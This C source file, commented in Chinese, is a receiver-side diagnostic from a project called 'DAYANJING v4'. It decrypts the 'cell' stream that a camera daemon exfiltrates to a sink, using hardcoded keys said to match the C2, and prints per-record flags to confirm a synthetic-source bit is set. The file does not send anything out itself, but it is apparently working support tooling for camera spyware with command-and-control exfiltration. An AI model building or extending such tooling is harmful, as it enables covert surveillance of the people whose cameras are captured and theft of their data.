/*
 * DAYANJING v4 — dump_srcflag.c
 *
 * 从 camd 的真实回传字节流里解出每条记录的 flags，用于验证
 * EXF_FLAG_SRC_SYNTH 在**真实运行**（而非单元测试）中确实被置位。
 *
 * 为什么不能只用单元测试：
 *   test_exfil_srcflag.c 证明"这个位能穿过信元层"，但证明不了
 *   cam_daemon 真的去置它。cd_pack 里那行依据 s->src_degrade 置位的
 *   代码若被漏写、或 src_degrade 从未被写入，单元测试依然全绿——
 *   因为它自己手工构造了 flags，根本不经过 cam_daemon。
 *
 * 本工具因此读 camd 落到 sink 的原始字节（信元流），用与 C2 相同的
 * 接收侧密钥解开，打印每条记录的 flags。它是"接收侧视角"的独立实现，
 * 不复用 cam_daemon 的任何发送侧逻辑。
 *
 * 用法：dump_srcflag <cells文件> [密钥档]
 *   无密钥档时使用 cam_daemon 的缺省密钥（DEF_K_SEND/DEF_K_RECV/DEF_PFX）。
 */

#include "exfil.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const uint8_t K_MY_SEND[P2P_CELL_KEY_LEN] = {
    0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87,
    0x78,0x69,0x5a,0x4b,0x3c,0x2d,0x1e,0x0f
};
static const uint8_t K_MY_RECV[P2P_CELL_KEY_LEN] = {
    0x0b,0x1c,0x2d,0x3e,0x4f,0x50,0x61,0x72,
    0x83,0x94,0xa5,0xb6,0xc7,0xd8,0xe9,0xfa
};
static const uint8_t PFX[P2P_CELL_PFX_LEN] = {
    0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00,0x11
};

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s <cells>\n", argv[0]); return 2; }

    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("open"); return 2; }

    exfil_chan_t ch;
    if (exfil_chan_init(&ch, K_MY_SEND, K_MY_RECV, PFX, 0) != 0) {
        fprintf(stderr, "chan_init failed\n"); return 2;
    }

    static uint8_t cell[P2P_CELL_WIRE];
    static uint8_t payload[1 << 22];
    size_t ncells = 0, nrec = 0;

    for (;;) {
        size_t got = fread(cell, 1, sizeof cell, f);
        if (got == 0) break;
        if (got != sizeof cell) {
            fprintf(stderr, "[WARN] 末尾残缺信元 %zu 字节，已忽略\n", got);
            break;
        }
        ncells++;

        exfil_rec_t r;
        memset(&r, 0, sizeof r);
        size_t plen = 0;
        int e = exfil_chan_feed(&ch, cell, &r, payload, sizeof payload, &plen);
        if (e == EXF_OK || e == EXF_PARTIAL) continue;
        if (e == EXF_DONE) {
            nrec++;
            printf("rec#%zu flags=0x%02x type=%u seq=%llu %ux%u plen=%zu"
                   "  SRC_SYNTH=%s\n",
                   nrec, r.flags, r.type, (unsigned long long)r.seq,
                   r.width, r.height, plen,
                   (r.flags & EXF_FLAG_SRC_SYNTH) ? "YES(合成源)" : "no(设备源)");
            continue;
        }
        fprintf(stderr, "[ERR] feed 失败 at cell %zu: %s (%d)\n",
                ncells, exfil_errstr(e), e);
        exfil_chan_wipe(&ch);
        fclose(f);
        return 1;
    }

    fclose(f);
    printf("---- 信元 %zu 个，记录 %zu 条 ----\n", ncells, nrec);
    printf("RESULT nrec=%zu\n", nrec);

    if (exfil_chan_incomplete(&ch)) {
        fprintf(stderr, "[ERR] 流被截断：仍有未完成的批\n");
        exfil_chan_wipe(&ch);
        return 1;
    }
    exfil_chan_wipe(&ch);
    return 0;
}
